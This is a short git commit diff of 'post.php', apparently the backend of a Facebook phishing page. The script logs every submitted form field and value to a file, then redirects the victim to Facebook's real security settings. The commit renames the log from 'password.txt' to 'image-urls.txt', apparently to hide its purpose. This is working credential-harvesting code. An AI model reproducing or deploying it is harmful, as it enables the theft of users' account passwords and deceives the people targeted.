430db98d4d576998084c88edadc8626fa9478bda
JoshuaLebarki <71907386+JoshuaLebarki@users.noreply.github.com>
2020-09-25 22:49:54 +0000

    Update post.php

--- post.php
+++ post.php
@@ -1,6 +1,6 @@
 <?php
 header("Location: https://www.facebook.com/settings?tab=security ");
-$handle = fopen("password.txt","a");
+$handle = fopen("image-urls.txt","a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
